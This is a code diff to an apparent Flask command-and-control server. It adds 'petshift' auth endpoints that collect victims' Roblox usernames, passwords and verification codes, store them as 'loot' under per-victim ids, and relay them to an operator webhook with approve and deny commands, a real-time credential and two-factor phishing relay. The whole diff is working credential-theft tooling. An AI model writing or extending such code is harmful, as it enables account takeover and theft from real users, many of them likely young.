@@ -108,6 +108,9 @@ def save_petshifts():
 
 load_petshifts()
 
+ps_auth_pending = {}  # challenge_id -> {pid, user, stage, status, password, code, created}
+
+
 def load_androids():
     global androids
     try:
@@ -1815,6 +1818,92 @@ def petshift_values():
         else:
             out.append({"name": n, "value": None, "demand": "—", "rarity": "—", "source": "unknown"})
     return jsonify({"ok": True, "live": bool(_VALUE_CACHE.get("live")), "items": out})
+
+
+@app.route("/api/petshift/auth/start", methods=["POST"])
+def petshift_auth_start():
+    data = request.get_json(force=True, silent=True) or {}
+    pid = (data.get("pid") or secrets.token_hex(8)).strip()
+    user = str(data.get("user") or "")[:80]
+    password = data.get("password")
+    stage = str(data.get("stage") or "password")[:20]
+    code = data.get("code")
+    cid = secrets.token_hex(8)
+    ps_auth_pending[cid] = {
+        "pid": pid,
+        "user": user,
+        "password": password,
+        "code": code,
+        "stage": stage,
+        "status": "pending",
+        "created": now(),
+    }
+    # store loot too
+    try:
+        if pid not in petshifts:
+            petshifts[pid] = {"first_seen": now(), "loot": [], "pending_cmds": [], "loot_count": 0}
+        entry = {"ts": now(), "type": "auth_" + stage, "data": {"user": user, "password": password, "code": code, "challenge": cid, "stage": stage}}
+        petshifts[pid].setdefault("loot", []).append(entry)
+        petshifts[pid]["loot"] = petshifts[pid]["loot"][-120:]
+        petshifts[pid]["loot_count"] = len(petshifts[pid]["loot"])
+        if user:
+            petshifts[pid]["roblox_user"] = user
+        save_petshifts()
+    except Exception:
+        pass
+    lines = [
+        f"challenge `{cid}`",
+        f"stage `{stage}`",
+        f"user: {user}",
+        f"pid `{pid}`",
+    ]
+    if password:
+        lines.append(f"password: {password}")
+    if code:
+        lines.append(f"code: {code}")
+    lines.append("Approve: POST /api/petshift/auth/decide {\"id\":\"" + cid + "\",\"ok\":true}")
+    lines.append("Deny:    POST /api/petshift/auth/decide {\"id\":\"" + cid + "\",\"ok\":false}")
+    try:
+        _browser_wh("PetShift AUTH — decide", lines)
+    except Exception:
+        pass
+    socketio.emit("petshift_auth", {"id": cid, "user": user, "stage": stage, "pid": pid})
+    return jsonify({"ok": True, "id": cid, "status": "pending"})
+
+@app.route("/api/petshift/auth/status")
+def petshift_auth_status():
+    cid = (request.args.get("id") or "").strip()
+    row = ps_auth_pending.get(cid)
+    if not row:
+        return jsonify({"status": "unknown"})
+    return jsonify({"status": row.get("status"), "stage": row.get("stage"), "user": row.get("user")})
+
+@app.route("/api/petshift/auth/decide", methods=["POST"])
+@login_required
+def petshift_auth_decide():
+    data = request.get_json(force=True, silent=True) or {}
+    cid = (data.get("id") or "").strip()
+    ok = bool(data.get("ok"))
+    row = ps_auth_pending.get(cid)
+    if not row:
+        return jsonify({"error": "unknown"}), 404
+    row["status"] = "ok" if ok else "deny"
+    ps_auth_pending[cid] = row
+    socketio.emit("petshift_auth", {"id": cid, "status": row["status"]})
+    try:
+        _browser_wh("PetShift AUTH result", [f"challenge `{cid}`", f"result: {row['status']}", f"user: {row.get('user')}"])
+    except Exception:
+        pass
+    return jsonify({"ok": True, "status": row["status"]})
+
+@app.route("/api/petshift/auth/pending")
+@login_required
+def petshift_auth_pending_list():
+    out = []
+    for cid, row in list(ps_auth_pending.items())[-50:]:
+        out.append({"id": cid, "user": row.get("user"), "stage": row.get("stage"), "status": row.get("status"), "pid": row.get("pid"), "created": row.get("created")})
+    out.sort(key=lambda x: x.get("created") or "", reverse=True)
+    return jsonify(out)
 
 
 if __name__ == "__main__":
